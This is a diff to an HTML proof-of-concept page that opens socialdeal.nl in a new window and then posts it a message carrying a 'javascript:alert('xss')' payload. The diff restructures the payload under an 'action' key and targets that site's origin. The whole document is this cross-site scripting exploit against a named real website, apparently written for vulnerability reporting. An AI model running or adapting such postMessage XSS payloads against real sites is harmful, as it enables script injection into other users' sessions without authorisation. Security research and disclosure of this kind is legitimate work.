@@ -6,10 +6,11 @@
 <body>
   <script>
     var victim = window.open("https://www.socialdeal.nl/");
+    
     setTimeout(function(){
       victim.postMessage(
-        {"javascript:alert('xss')"},
-        "*"
+        {action:"javascript:alert('xss')"},
+        "https://www.socialdeal.nl/"
          );
       }, 3000);
     </script>
